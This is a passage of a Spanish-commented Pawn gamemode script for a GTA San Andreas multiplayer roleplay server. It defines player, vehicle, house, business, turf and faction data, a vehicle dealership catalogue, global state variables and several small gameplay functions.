	pLicConduccion, //Licencia conducción
	pLicNavegacion, //Licencia navegación
	pLicAviacion, //Licencia aviación
	pLicArmas, //Licencia armas
	pLicPesca, //Licencia pesca
	pLicCaza, //Licencia caza
	pCasa, //Casa del jugador
	pCasaAlq, //Casa alquilada del jugador
	pNegocio, //Negocio del jugador
	pTaller, //Taller en el que trabaja (mecánico)
	pHabMec, //Habilidad de mecánico
	pHabLad, //Habilidad de ladrón
	pTiempoRobo, //Tiempo que tiene que pasar para volver a robar
	pHambre, //Hambre del personaje
	pSed, //Sed del personaje
	pAdiccion[5], //Adiccion a las drogas
	pDrConsumida[5], //Drogas consumidad
	pFuerza, //Fuerza del jugador
	pCansancioEntrenar, //Cansancio despues de entrenar
	pMinutosJugador, //Tiempo total jugado
};
new PlayerInfo[MAX_PLAYERS][pInfo];

enum cInfo //Información coches
{
	cSQLID, //ID en base de datos
	cID, //ID en SAMP
	cLlave, //Llave del vehículo
	cModelo, //Modelo del vehículo
	Float:cPosX, //Posición X
	Float:cPosY, //Posición Y
	Float:cPosZ, //Posición Z
	Float:cZAngle, //Ángulo
	cColor1, //Color 1
	cColor2, //Color 2
	cComprado, //Si tiene propietario
	cDueno[MAX_PLAYER_NAME], //Nombre del propietario
	cNombreModelo[MAX_PLAYER_NAME], //Nombre del modelo
	cValor, //Coste del vehículo
	cCerrado, //Si está cerrado
	cGas, //Combustible
	cEnDeposito, //Si está en el depósito
	cMaletero[7], //Slot de cada maletero
	cMaleteroCant[7], //Cantidad de cada maletero
	cMaxMaletero, //Número de slots que el maletero podrá tener
	cPanels, //Daño superficies
	cDoors, //Daño puertas
	cLights, //Daño luces
	cTires, //Ruedas pinchadas
	Float:cDamage, //Daño del vehículo
	cVirtualWorld, //VW del vehículo
	cInterior, //Interior del vehículo
};
new CarInfo[MAX_VEHICLES][cInfo];

enum hInfo //Información casas
{
	hSQLID, //ID en base de datos
	Float:hEntradaX, //Pos x de entrada
	Float:hEntradaY, //Pos y de entrada
	Float:hEntradaZ, //Pos z de entrada
	Float:hSalidaX, //Pos x de salida
	Float:hSalidaY, //Pos y de salida
	Float:hSalidaZ, //Pos z de salida
	hBarrio[90], //Nombre del barrio
	hVirtualWorld, //VW de la casa
	hInterior, //Int de la casa
	hVirtualWorld2, //VW de salida
	hInterior2, //Int de salida
	hValor, //Precio de la casa
	hComprada, //Si está comprada
	hDueno[60], //Nombre del dueño
	hCerrada, //Si está cerrada
	Text3D:hPickup, //3DTextLabel
	hAlquilable, //Si está alquilable
	hPAlquiler, //Precio de alquiler
	hInquilinos, //Personas residentes en la casa
	hArmario[10], //Slot de cada armario
	hArmarioCant[10], //Cantidad de cada slot
	hDineroGuardado, //Dinero guardado en la casa
};
new HouseInfo[MAX_HOUSES][hInfo];

enum nInfo //Información negocios
{
	nSQLID, //ID en base de datos
	Float:nEntradaX, //Pos x de entrada
	Float:nEntradaY, //Pos y de entrada
	Float:nEntradaZ, //Pos z de entrada
	Float:nSalidaX, //Pos x de salida
	Float:nSalidaY, //Pos y de salida
	Float:nSalidaZ, //Pos z de salida
	nNombre[120], //Nombre del negocio
	nTipo, //Tipo de negocio
	nVirtualWorld, //VW del negocio
	nInterior, //Int del negocio
	nVirtualWorld2, //VW de salida
	nInterior2, //Int de salida
	nValor, //Precio del negocio
	nComprado, //Si está comprado
	nDueno[60], //Nombre del dueño
	nCerrado, //Si está cerrado
	Text3D:nPickup, //3DTextLabel
	nDineroGuardado, //Dinero guardado en el negocio
	nProd, //Productos del negocio
	nMaxAlmacen, //Máximo slots de almacén
	nAlmacen[25], //Slot de cada almacén
	nAlmacenCant[25], //Cantidad de cada slot
	Float:nTallerEX, //Pos x de entrada taller
	Float:nTallerEY, //Pos y de entrada taller
	Float:nTallerEZ, //Pos z de entrada taller
	Float:nTallerERotZ, //Rot entrada taller
	Float:nTallerSX, //Pos x de salida taller
	Float:nTallerSY, //Pos y de salida taller
	Float:nTallerSZ, //Pos z de salida taller
	Float:nTallerSRotZ, //Rot entrada taller
};
new NegoInfo[MAX_NEGS][nInfo];

enum tInfo //Sistema turfs
{
    tID,
    tTurf,
    tArea,
    Float:tMinX,
    Float:tMinY,
    Float:tMaxX,
    Float:tMaxY,
    tFaccion,
    tNivel,
    tAtacante,
    Float:tDistrbuirDrogaX,
    Float:tDistrbuirDrogaY,
    Float:tDistrbuirDrogaZ,
    tDrogaVendida[5],
};
new TurfInfo[MAX_TURFS][tInfo];

enum fInfo //Sistema facciones
{
    fID,
    fNombre[60],
    fRango1[32],
    fRango2[32],
    fRango3[32],
    fRango4[32],
    fRango5[32],
    fRango6[32],
    fRango7[32],
    fRango8[32],
    fLider[32],
    fTipo,
	fColor[9],
	fPuntosExpansion,
	fTiempoArmas,
	fTiempoDrogas
};
new FaccInfo[MAX_FACCS][fInfo];

enum dData //Sistema objetos caídos
{
    DropID,
    DropCantidad,
    Float:DropPosX,
    Float:DropPosY,
    Float:DropPosZ,
    DropVWorld,
    DropInterior,
};
new DropInfo[MAX_DROP_ITEM][dData];

enum ConceInfo //Concesionarios
{
	Float:cX,
	Float:cY,
	Float:cZ,
	Float:ctX,
	Float:ctY,
	Float:ctZ,
	cNombre[128],
}
new Concesionarios[7][ConceInfo] = {
	{2131.4873,-1148.9374,24.3184, 2126.2341,-1132.8004,25.2141, "Rusty Rides"},
	{-77.5412,-1136.4923,1.0781, -73.5055,-1117.1786,1.1894, "Heavy Weight Trucks"},
	{1410.6371,-1703.0380,13.5395, 1419.8628,-1682.4360,13.6594, "Gentlemen Cars"},
	{2329.6626,-2315.8853,13.5469, 2314.8059,-2307.7781,13.6553, "Motorsport"},
	{521.2985,-1293.2179,17.2422, 528.9742,-1286.6652,17.3518, "Luxury Vehicles & Co."},
	{1952.8345,-2179.1643,13.5469, 1936.2897,-2307.1697,13.5469, "Flying Stars Planes"},
	{732.8066,-1476.6700,5.4688, 728.8990,-1503.9154,0.0934, "Seaside Boats"}
};

enum datos_del_coche
{
	dcCategoria,
	dcNombre[30],
	dcIDModel,
	dcPrecio,
	dcConcesionario, // Concesionario
	dcNivel,
}
new datacar[MAX_CAR_DATA][datos_del_coche] = {
/* TARTANAS GAMA CHUNGA */

{0, "Glendale", 466, 8000, 1,1},
{0, "Oceanic", 467, 8000, 1,1},
{0, "Clover", 542, 7000, 1,1},
{0, "Tampa", 549, 7000, 1,1},
{0, "Walton", 478, 7000, 1,1},
{0, "Sadler", 543, 7000, 1,1},
{0, "Esperanto", 419, 7000, 1,1},
{0, "Buccaneer", 518, 9000, 1,1},
{0, "Blista", 496, 13000, 1,1},
{0, "Perennial", 404, 8000, 1,1},
{0, "Regina", 479, 8000, 1,1},

/* LOWRIDERS / OTROS */

{0, "Voodoo", 412, 35000, 1,3},
{0, "Remington", 534, 39000, 1,3},
{0, "Tahoma", 566, 45000, 1,2},
{0, "Majestic", 517, 37000, 1,2},
{0, "Tornado", 576, 35000, 1,3},
{0, "Broadway", 575, 45000, 1,3},
{0, "Savanna", 567, 50000, 1,3},
{0, "Slamvan", 535, 45000, 1,3},
{0, "Blade", 536, 40000, 1,3},
{0, "Stallion", 439, 60000, 1,2},
{0, "Phoenix", 603, 70000, 1,4},
{0, "Hermes", 474, 60000, 1,4},
{0, "Sabre", 475, 50000, 1,3},

/* FRAGONETAS Y CURROS */

{0, "Tractor", 531, 8000, 2,1},
{0, "Benson", 499, 12000, 2,1},
{0, "Moonbeam", 418, 15000, 2,1},
{0, "Bobcat", 422, 20000, 2,1},
{0, "Pony", 413, 17000, 2,2},
{0, "Rumpo", 440, 25000, 2,2},
{0, "Picador", 600, 35000, 2,3},
{0, "Burrito", 482, 50000, 2,3},
{0, "Yosemite", 554, 50000, 2,3},
{0, "Camper", 483, 60000, 2,4},
{0, "Quad", 471, 55000, 2,12},

/* 4x4 */

{0, "Rancher", 489, 50000, 2,2},
{0, "Landstalker", 400, 140000, 2,3},
{0, "Huntley", 579, 200000, 2,5},
{0, "Towtruck", 525, 40000, 2,2},
{0, "Mesa", 500, 80000, 2,3},


/* BERLINAS */

{0, "Greenwood", 492, 40000, 3,1},
{0, "Virgo", 491, 35000, 3,1},
{0, "Willard", 529, 10000, 3,1},
{0, "Manana", 410, 13000, 3,1},
{0, "Bravura", 401, 25000, 3,1},
{0, "Previon", 436, 26000, 3,1},
{0, "Primo", 547, 38000, 3,2},
{0, "Emperor", 585, 41000, 3,2},
{0, "Nebula", 516, 39500, 3,2},
{0, "Sunrise", 550, 43000, 3,2},
{0, "Intruder", 546, 48000, 3,2},
{0, "Vincent", 540, 45000, 3,2},
{0, "Fortune", 526, 43000, 3,2},
{0, "Cadrona", 527, 46000, 3,2},
{0, "Premier", 426, 80000, 3,3},
{0, "Merit", 551, 70000, 3,3},
{0, "Sentinel", 405, 120000, 3,5},
{0, "Washington", 421, 130000, 3,5},
{0, "Admiral", 445, 140000, 3,5},
{0, "Elegant", 507, 150000, 3,5},

/* STREET RACERS */

{0, "Flash", 565, 40000, 4,3},
{0, "Club", 589, 30000, 4,3},
{0, "Stratum", 561, 80000, 4,3},
{0, "Alpha", 602, 80000, 4,3},
{0, "Uranus", 558, 90000, 4,3},
{0, "Euros", 587, 90000, 4,4},
{0, "Jester", 559, 110000, 4,5},
{0, "ZR-350", 477, 110000, 4,5},
{0, "Buffalo", 402, 100000, 4,6},
{0, "Elegy", 562, 100000, 4,6},
{0, "Sultan", 560, 170000, 4,6},
{0, "SuperGT", 506, 600000, 4,8},
{0, "Infernus", 411, 800000, 4,8},

/* COSTE ELEVADO */

{0, "Journey", 508, 100000, 5,5},
{0, "Hustler", 545, 120000, 5,5},
{0, "Windsor", 555, 200000, 5,5},
{0, "Feltzer", 533, 250000, 5,5},
{0, "Stafford", 580, 400000, 5,8},
{0, "Stretch", 409, 800000, 5,8},

/* MOTOS */

{1, "Freeway", 463, 17000, 5,3},
{1, "Wayfarer", 586, 20000, 5,3},
{1, "Sanchez", 468, 36000, 5,4},
{1, "BF-400", 581, 50000, 5,5},
{1, "FCR-900", 521, 90000, 5,7},

/* SUPERCARS */

{0, "Comet", 480, 800000, 5,8},
{0, "Banshee", 429, 900000, 5,8},
{0, "Bullet", 541, 900000, 5,8},
{0, "Cheetah", 415, 1200000, 5,10},
{0, "Turismo", 451, 1500000, 5,10},

/* AERONAVES */

{2, "Maverick", 487, 1000000, 6,10},
{2, "Dodo", 593, 700000, 6,10},
{2, "Shamal", 519, 2000000, 6,10},
{2, "Skimmer", 460, 750000, 6,10},
{2, "Beagle", 511, 1000000, 6,10},

/* BARCOS */

{3, "Reefer", 453, 60000, 7,1},
{3, "Tropic", 454, 800000, 7,8},
{3, "Squalo", 446, 500000, 7,5},
{3, "Speeder", 452, 200000, 7,5},
{3, "Jetmax", 493, 280000, 7,8},
{3, "Marquis", 484, 600000, 7,8}
};

enum TiempoInfo //Tiempo aleatorio
{
	TiempoID
};

new TiempoAleatorioID[][TiempoID] =
{
{0},{1},{2},{3},
{4},{5},{6},{7},
{9},{10},{11},{17},
{18},{12},{13},{14},
{15}
};

enum cpInfo //Objetos trafico
{
	cpType,
	cpCreated,
    Float:cpX,
    Float:cpY,
    Float:cpZ,
    cpObject,
};
new ObjectsInfo[MAX_COPOBJS][cpInfo];

//News
//--------- Msyql ---------//
new ConectadoBaseDatos;
//--------- Sistema de logueo ---------//
new JugadorLogueado[MAX_PLAYERS];
new JugadorRegistrado[MAX_PLAYERS];
new IntentosLogueo[MAX_PLAYERS];
//--------- Sistema de spawn ---------//
new PrimerSpawn[MAX_PLAYERS];
//--------- Sistema de chat ---------//
new ChatNormal = 1;
//--------- Sistema admin duty ---------//
new AdminDuty[MAX_PLAYERS];
//--------- Sistema godmode ---------//
new GodMode[MAX_PLAYERS];
//--------- Comando /gotomark ---------//
new Float:MarkX[MAX_PLAYERS], Float:MarkY[MAX_PLAYERS], Float:MarkZ[MAX_PLAYERS], Float:MarkA[MAX_PLAYERS], MarkI[MAX_PLAYERS], MarkVW[MAX_PLAYERS];
//--------- Sistema de vuelo ---------//
new Volando[MAX_PLAYERS];
//--------- Sistema de recon ---------//
new Float:RecPos[MAX_PLAYERS][4], IntRec[MAX_PLAYERS], VwRec[MAX_PLAYERS];
//--------- Chat OOC /b ---------//
new ChatOOC[MAX_PLAYERS];
//--------- Comando /yo ---------//
new YoTexto[MAX_PLAYERS][60];
new Text3D:Yo3DText[MAX_PLAYERS];
new Yo[MAX_PLAYERS];
//--------- Puertas LSPD ---------//
new lspdpuerta1, lspdpuerta2, lspdpuerta3, lspdpuerta4, lspdpuerta5, lspdpuerta6, lspdpuerta7;
new Celda1, Celda2, Celda3;
new lspddeposito;
new puertaprision, puertaprision2;
new puertaceldaprision1;
new puertaceldaprision2;
new puertaceldaprision3;
new puertaceldaprision4;
new puertaceldaprision5;
new puertaceldaprision6;
new puertaceldaprision7;
new puertaceldaprision8;
new puertaceldaprision9;
new puertaceldaprision10;
new puertaceldaprision11;
new puertaceldaprision12;
new puertaceldaprision13;
new puertaceldaprision14;
new puertaceldaprision15;
new puertapatioprision;
//--------- Cristales LSPD ---------//
new cristal1, cristal2, cristal3, cristal4, cristal5, cristal6, cristal7, cristal8;
//--------- Puertas LSN ---------//
new LSNpuerta1, LSNpuerta2;
//--------- Comando reclutar ---------//
new reclutarfaccion[MAX_PLAYERS];
new reclutarlider[MAX_PLAYERS];
//--------- Sonido de armas al disparar ---------//
new TimerSonidoDisparo[MAX_PLAYERS];
//--------- Sistema arrancado vehiculos ---------//
new EncendiendoMotor[MAX_PLAYERS];
//--------- Name OFF ---------//
new PlayerNameOff[MAX_PLAYERS];
//--------- /AHora ---------//
new ahora;
//--------- Sistema de muerte ---------//
new Float:MuertoX[MAX_PLAYERS], Float:MuertoY[MAX_PLAYERS], Float:MuertoZ[MAX_PLAYERS];
new MuertoInt[MAX_PLAYERS], MuertoVW[MAX_PLAYERS];
new MuertoTimer[MAX_PLAYERS];
new MuertoFlashTimer[MAX_PLAYERS];
new Muerte[MAX_PLAYERS];
//--------- Táser ---------//
new Taseado[MAX_PLAYERS];
new TaserRecarga[MAX_PLAYERS];
//--------- Objetos caídos ---------//
new DropObject[MAX_DROP_ITEM];
//--------- Catalogo concesionario ---------//
new EnCatalogoVeh[MAX_PLAYERS];
new PConcesionario[MAX_PLAYERS];
new Text:Modelo[MAX_CAR_DATA];
new Text:CocheNombre[MAX_CAR_DATA];
new Text:Costo[MAX_CAR_DATA];
new Text:Id[MAX_CAR_DATA];
new Text:fila1;
new Text:fila2;
new Text:fila3;
new Text:fila4;
//--------- Anti BH ---------//
new AntiBH[MAX_PLAYERS];
new AntiBHTimerPlayer[MAX_PLAYERS];
//--------- Sistema de vehículos ---------// <--importante de cojones
new CodigoLlave;
new TotalVeh;
//--------- Textdraw foro ---------//
new Text:Foro;
//--------- Sistema esposas ---------//
new Esposado[MAX_PLAYERS];
//--------- Sistema esposas ---------//
new SolicitaRefuerzos[MAX_PLAYERS];
new NoRefAuto[MAX_PLAYERS];
//--------- Máscara antigas ---------//
new MascaraGas[MAX_PLAYERS];
//--------- Timer de ceder ---------//
new CederTiempo[MAX_PLAYERS];
//--------- Timer de recargar ---------//
new RecargarTiempo[MAX_PLAYERS];
//--------- Sistema de multas ---------//
new MultaPrecio[MAX_PLAYERS];
new Multador[MAX_PLAYERS];
//--------- Sistema de multas ---------//
new LlenandoDeposito[MAX_PLAYERS];
//--------- VenderVeh ---------//
new VenderVeh[MAX_PLAYERS];
//--------- VenderVehA ---------//
new VenderVehAPrecio[MAX_PLAYERS];
new VenderVehAVendedor[MAX_PLAYERS];
new VenderVehALlave[MAX_PLAYERS];
//--------- Sistema de depósito/desguace ---------//
new VehExplotado[MAX_VEHICLES];
//--------- Localizarveh ---------//
new LocalizarVeh[MAX_PLAYERS];
//--------- Capó y maletero ---------//
new VehCapo[MAX_VEHICLES];
new VehMaletero[MAX_VEHICLES];
new VehMaleteroPlayer[MAX_PLAYERS];
//--------- Ventanilla de vehículos ---------//
new VehicleWindows[MAX_VEHICLES];
//--------- Velocímetro ---------//
new Text:box[MAX_PLAYERS],Text:vvel[MAX_PLAYERS],Text:fuel[MAX_PLAYERS],velocidad[MAX_PLAYERS];
//--------- Sistema autoescuela ---------//
new EnAutoEscuela[MAX_PLAYERS];
new CheckPointAutoEscuela[MAX_PLAYERS];
new MaxVelAutoEscuela[MAX_PLAYERS];
new MaxTiempoAutoEscuelaTimer[MAX_PLAYERS];
//--------- Directo LSN ---------//
new DirectoLSNCoche[MAX_VEHICLES];
//--------- Sistema casas ---------//
new TotalCasas;
//--------- Sistema negocios ---------//
new TotalNegs;
new Contratador[MAX_PLAYERS];
new Contrato[MAX_PLAYERS];
//--------- Sistema trabajos ---------//
new OfertaTrabajo[MAX_PLAYERS];
new Trabajando[MAX_PLAYERS];
new Tarifa[MAX_PLAYERS];
new TimerDejarTrabajar[MAX_PLAYERS];
new PizzaRepartida[MAX_PLAYERS];
new SolicitaPizza[MAX_PLAYERS];
new CalleBarrida[MAX_PLAYERS];
new CajeroRepuesto[MAX_PLAYERS];
new Cosechado[MAX_PLAYERS];
new Fumigado[MAX_PLAYERS];
new TaxiConductor[MAX_PLAYERS];
new TaxiPasajero[MAX_PLAYERS];
new TaxiCoste[MAX_PLAYERS];
new SolicitaTaxi[MAX_PLAYERS];
new ReparacionTipo[MAX_PLAYERS];
new ReparacionMeca[MAX_PLAYERS];
new ReparacionPrecio[MAX_PLAYERS];
new RepintadoColor1[MAX_PLAYERS];
new RepintadoColor2[MAX_PLAYERS];
new RepintadoMeca[MAX_PLAYERS];
new RepintadoPrecio[MAX_PLAYERS];
new PuertaForzada[MAX_PLAYERS];
new Robando[MAX_PLAYERS];
new RoboTimer[MAX_PLAYERS];
new Puenteando[MAX_PLAYERS];
new PuenteTimer[MAX_PLAYERS];
new PuenteHecho[MAX_PLAYERS];
new PescaRecogida[MAX_PLAYERS];
new DineroPesca[MAX_PLAYERS];
//--------- Menú de tiendas y locales ---------//
new Menu:restaurantes;
new Menu:bares;
new Menu:comidasrapidas;
new Menu:discoteca;
new Menu:puticlub;
new Menu:ammunation;
new Menu:menu247;
new Menu:tiendadeportes;
new Menu:ferreteria;
new Menu:tiendaropa;
new Menu:electronica;
new Menu:estanco;
new Menu:licoreria;
//--------- Sistema teléfono ---------//
new EnLlamada[MAX_PLAYERS];
new ToqueLlamada[MAX_PLAYERS];
new PersonaEnLlamada[MAX_PLAYERS];
new ToqueLlamadaTimer[MAX_PLAYERS];
new CostoLlamadaTimer[MAX_PLAYERS];
new CosteTotalLlamada[MAX_PLAYERS];
//--------- Sistema hambre y sed ---------//
new Text:hambre[MAX_PLAYERS];
new Text:sed[MAX_PLAYERS];
new PlayerBar:hambrebar[MAX_PLAYERS] =  {INVALID_PLAYER_BAR_ID, ...};
new PlayerBar:sedbar[MAX_PLAYERS] =  {INVALID_PLAYER_BAR_ID, ...};
//--------- Sistema hambre y sed ---------//
new AgendaNumero[MAX_PLAYERS][16];
new AgendaContacto[MAX_PLAYERS][16][41];
new MirandoContactoAgenda[MAX_PLAYERS];
//--------- Sistema turfs ---------//
new TotalTurfs;
//--------- Sistema facciones ---------//
new TotalFaccs;
//--------- Sistema idiomas ---------//
new Idioma[MAX_PLAYERS];
//--------- Comando /oldcar ---------//
new oldcarid[MAX_PLAYERS];
//--------- Comando /pagar ---------//
new PagarTimer[MAX_PLAYERS];
//--------- Tiempo automático ---------//
new DefaultWeather;
//--------- Comando /editnego ---------//
new EditNegoPos[MAX_PLAYERS];
//--------- Sistema plantaciones ---------//
new TotalPlantaciones;
new CodigoPlantacion;
//--------- Comando /preparar ---------//
new PreparandoDroga[MAX_PLAYERS];
//--------- Selección skin tiendas de ropa ---------//
new ropa = mS_INVALID_LISTID;
//--------- Comando /Intentar ---------//
new IntentarUsado[MAX_PLAYERS];
//--------- Depósito LSPD ---------//
new AreaDepositoLSPD;
//--------- Aviso de compra de armas y drogas a LSPD ---------//
new AvisoLSPDCompraArmas;
new AvisoLSPDCompraDrogas;
//--------- Sistema de misiones de pandillas ---------//
new MisionEncargada[MAX_PLAYERS];
new RealizandoMision[MAX_PLAYERS];
new MuroAPintar[MAX_PLAYERS];
//--------- ATM Transferir ---------//
new TransferirPlayer[MAX_PLAYERS];
//--------- Comando /Entrenar ---------//
new HaciendoPressBanca[MAX_PLAYERS];
new RepeticionesPressBanca[MAX_PLAYERS];
new ProgresoPressBanca[MAX_PLAYERS];
new PressBancaBarraObjeto[3];
//--------- Sistema matrículas ---------//
new MatriculasActivadas[MAX_PLAYERS];
new PlayerText3D:MatriculasCoches[MAX_PLAYERS][MAX_VEHICLES];
//--------- Anticheat ---------//
new DineroAC[MAX_PLAYERS];
new PingKick[MAX_PLAYERS];
new ArmaSpawnAC[MAX_PLAYERS];
new TimerBlockIP[MAX_PLAYERS];
new Float:AntiAFKPos[MAX_PLAYERS][6];
new EstaAFK[MAX_PLAYERS];
new AFKTimer[MAX_PLAYERS];
new ChalecoAC[MAX_PLAYERS];
new VehicleHack[MAX_PLAYERS];
//new CurrentVeh[MAX_PLAYERS];
//--------- Sistema de lasers en armas ---------//
new LaserON[MAX_PLAYERS];
//--------- Sistema de anuncios ---------//
new anunciotiempo;
//--------- Comando /autoreparar ---------//
new SiendoReparado[MAX_PLAYERS];
//--------- Comando /cinturon ---------//
new CinturonPuesto[MAX_PLAYERS];
//--------- Comando /PrestarLlave ---------//
new PrestadorCoche[MAX_PLAYERS];
new LlavePrestada[MAX_PLAYERS];
//--------- Informes LSED ---------//
new AtendiendoInforme[MAX_PLAYERS];
//--------- /Sirena ---------//
new SirenaCoche[MAX_VEHICLES];
//Funciones
forward QuitarInforme(id_jugador); //Informes LSED
public QuitarInforme(id_jugador)
{
    for(new i = 0; i < MAX_LSEDINFORMES; i++)
	{
	    if(InformeEmergencias[i][ieEstado] == 0 && InformeEmergencias[i][ieJugador] == id_jugador)
		{
			InformeEmergencias[i][ieEstado] = NOEXISTE;
			for(new j = 0; j < MAX_PLAYERS; j++)
			{
			    if(AtendiendoInforme[j] == id_jugador)
			    {
			        DisablePlayerCheckpoint(j);
			        SendClientMessage(j, Rojo, "* Has tardado mucho en llegar a la emergencia, el sujeto fué trasladado al hospital por otra unidad.");
			    }
			}
			break;
		}
	}
	return 1;
}

stock GenerarInforme(playerid, Float:x, Float:y, Float:z) //Informes LSED
{
	for(new i = 0; i < MAX_LSEDINFORMES; i++)
	{
	    InformeEmergencias[i][ieEstado] = 0; InformeEmergencias[i][ieJugador] = playerid;
		InformeEmergencias[i][ieX] = x; InformeEmergencias[i][ieY] = y; InformeEmergencias[i][ieZ] = z;
		InformeEmergencias[i][ieTimer] = SetTimerEx("QuitarInforme", (5*60000), true, "i", playerid);
		SendRadioMessage(2, AguamarinaOscuro, "[Radio] Central: Un nuevo aviso está a la espera de ser atendido. ((Usa '/informes' para más información))");
		break;
	}
	return 1;
}

forward SpawnBug(playerid);
public SpawnBug(playerid)
{
    new Float:pos[3];
	GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
	if(pos[0] >= 1920 && pos[0] <= 1970 && pos[1] >= 1325 && pos[1] <= 1375)
	{
	    PlayerInfo[playerid][pMuerto] = 0;
	    TogglePlayerControllable(playerid, 1);
	    SetPlayerPos(playerid, 1479.6182, -1724.0615, 13.5469);
	    new string[128];
	    format(string, sizeof(string), "'%s' ha spawneado bug y ha sido llevado al ayuntamiento.", GetPlayerNameRP(playerid));
	    SendAdminMessage(Aguamarina, string);
	    SendClientMessage(playerid, Amarillo, "* Has spawneado bug y has sido llevado al ayuntamiento.");
	}
	return 1;
}

stock EspaciosMaletero(i) //TESTEAR
{
    new espacios;
    switch(i)
    {
        case 400: { espacios = 7; }
        case 401: { espacios = 5; }
        case 402: { espacios = 5; }
        case 403: { espacios = 10; }
        case 404: { espacios = 5; }
        case 405: { espacios = 5; }
        case 406: { espacios = 10; }
        case 407: { espacios = 10; }
        case 408: { espacios = 10; }
        case 409: { espacios = 5; }
        case 410: { espacios = 4; }
        case 411: { espacios = 3; }
        case 412: { espacios = 5; }
        case 413: { espacios = 9; }
        case 414: { espacios = 10; }
        case 415: { espacios = 3; }
        case 416: { espacios = 10; }
        case 417: { espacios = 10; }
        case 418: { espacios = 6; }
        case 419: { espacios = 5; }
        case 420: { espacios = 5; }
        case 421: { espacios = 5; }
        case 422: { espacios = 6; }
        case 423: { espacios = 10; }
        case 424: { espacios = 2; }
        case 425: { espacios = 2; }
        case 426: { espacios = 5; }
        case 427: { espacios = 10; }
        case 428: { espacios = 10; }
        case 429: { espacios = 4; }
        case 430: { espacios = 8; }
        case 431: { espacios = 10; }
        case 432: { espacios = 2; }
        case 433: { espacios = 10; }
        case 434: { espacios = 2; }
        case 435: { espacios = 10; }
        case 436: { espacios = 4; }
        case 437: { espacios = 10; }
        case 438: { espacios = 5; }
        case 439: { espacios = 4; }
        case 440: { espacios = 9; }
        case 442: { espacios = 1; }
        case 443: { espacios = 2; }
        case 444: { espacios = 2; }
        case 445: { espacios = 5; }
        case 446: { espacios = 1; }
        case 447: { espacios = 2; }
        case 448: { espacios = 2; }
        case 449: { espacios = 10; }
        case 450: { espacios = 10; }
        case 451: { espacios = 3; }
        case 452: { espacios = 4; }
        case 453: { espacios = 8; }
        case 454: { espacios = 10; }
        case 455: { espacios = 10; }
        case 456: { espacios = 10; }
        case 457: { espacios = 2; }
        case 458: { espacios = 5; }
        case 459: { espacios = 8; }
        case 460: { espacios = 2; }
        case 461: { espacios = 2; }
        case 462: { espacios = 1; }
        case 463: { espacios = 2; }
        case 466: { espacios = 4; }
        case 467: { espacios = 5; }
        case 468: { espacios = 2; }
        case 469: { espacios = 4; }
        case 470: { espacios = 8; }
        case 471: { espacios = 2; }
        case 472: { espacios = 4; }
        case 473: { espacios = 3; }
        case 474: { espacios = 4; }
        case 475: { espacios = 4; }
        case 476: { espacios = 4; }
        case 477: { espacios = 4; }
        case 478: { espacios = 7; }
        case 479: { espacios = 6; }
        case 480: { espacios = 4; }
        case 482: { espacios = 10; }
        case 483: { espacios = 6; }
        case 484: { espacios = 10; }
        case 485: { espacios = 2; }
        case 486: { espacios = 2; }
        case 487: { espacios = 10; }
        case 488: { espacios = 10; }
        case 489: { espacios = 8; }
        case 490: { espacios = 8; }
        case 491: { espacios = 4; }
        case 492: { espacios = 6; }
        case 493: { espacios = 8; }
        case 494: { espacios = 3; }
        case 495: { espacios = 2; }
        case 496: { espacios = 3; }
        case 497: { espacios = 10; }
        case 498: { espacios = 10; }
        case 499: { espacios = 10; }
        case 500: { espacios = 2; }
        case 502: { espacios = 2; }
        case 503: { espacios = 2; }
        case 504: { espacios = 2; }
        case 505: { espacios = 8; }
        case 506: { espacios = 3; }
        case 507: { espacios = 5; }
        case 508: { espacios = 10; }
        case 511: { espacios = 4; }
        case 512: { espacios = 4; }
        case 513: { espacios = 4; }
        case 514: { espacios = 2; }
        case 515: { espacios = 2; }
        case 516: { espacios = 5; }
        case 517: { espacios = 5; }
        case 518: { espacios = 4; }
        case 519: { espacios = 10; }
        case 520: { espacios = 2; }
        case 521: { espacios = 2; }
        case 522: { espacios = 2; }
        case 523: { espacios = 4; }
        case 524: { espacios = 2; }
        case 525: { espacios = 4; }
        case 526: { espacios = 5; }
        case 527: { espacios = 5; }
        case 528: { espacios = 10; }
        case 529: { espacios = 4; }
        case 530: { espacios = 1; }
        case 531: { espacios = 1; }
        case 532: { espacios = 1; }
        case 533: { espacios = 4; }
        case 534: { espacios = 6; }
        case 535: { espacios = 6; }
        case 536: { espacios = 5; }
        case 537: { espacios = 10; }
        case 538: { espacios = 10; }
        case 540: { espacios = 4; }
        case 541: { espacios = 4; }
        case 542: { espacios = 4; }
        case 543: { espacios = 6; }
        case 544: { espacios = 10; }
        case 545: { espacios = 3; }
        case 546: { espacios = 4; }
        case 547: { espacios = 5; }
        case 548: { espacios = 10; }
        case 549: { espacios = 6; }
        case 550: { espacios = 5; }
        case 551: { espacios = 5; }
        case 552: { espacios = 10; }
        case 553: { espacios = 10; }
        case 554: { espacios = 8; }
        case 555: { espacios = 4; }
        case 556: { espacios = 2; }
        case 557: { espacios = 2; }
        case 558: { espacios = 4; }
        case 559: { espacios = 3; }
        case 560: { espacios = 5; }
        case 561: { espacios = 8; }
        case 562: { espacios = 4; }
        case 563: { espacios = 10; }
        case 565: { espacios = 3; }
        case 566: { espacios = 4; }
        case 567: { espacios = 4; }
        case 568: { espacios = 1; }
        case 569: { espacios = 10; }
        case 570: { espacios = 10; }
        case 571: { espacios = 1; }
        case 572: { espacios = 1; }
        case 573: { espacios = 2; }
        case 574: { espacios = 2; }
        case 575: { espacios = 3; }
        case 576: { espacios = 6; }
        case 577: { espacios = 10; }
        case 578: { espacios = 2; }
        case 579: { espacios = 8; }
        case 580: { espacios = 5; }
        case 581: { espacios = 2; }
        case 582: { espacios = 10; }
        case 583: { espacios = 1; }
        case 585: { espacios = 4; }
        case 586: { espacios = 4; }
        case 587: { espacios = 3; }
        case 588: { espacios = 8; }
        case 589: { espacios = 3; }
        case 592: { espacios = 10; }
        case 593: { espacios = 4; }
        case 595: { espacios = 8; }
        case 596: { espacios = 6; }
        case 597: { espacios = 6; }
        case 598: { espacios = 6; }
        case 599: { espacios = 6; }
        case 600: { espacios = 7; }
        case 601: { espacios = 4; }
        case 602: { espacios = 4; }
        case 603: { espacios = 4; }
        case 609: { espacios = 10; }
    }
    return espacios;
}

forward AsignarTiempoCompraMafias(faccionid, tipo);
public AsignarTiempoCompraMafias(faccionid, tipo)
{
	if(tipo == 1) //Armas
	{
	    FaccInfo[faccionid][fTiempoArmas] = 48;
	    SaveFacc(faccionid);
	}
	if(tipo == 2) //Drogas
	{
	    FaccInfo[faccionid][fTiempoDrogas] = 48;
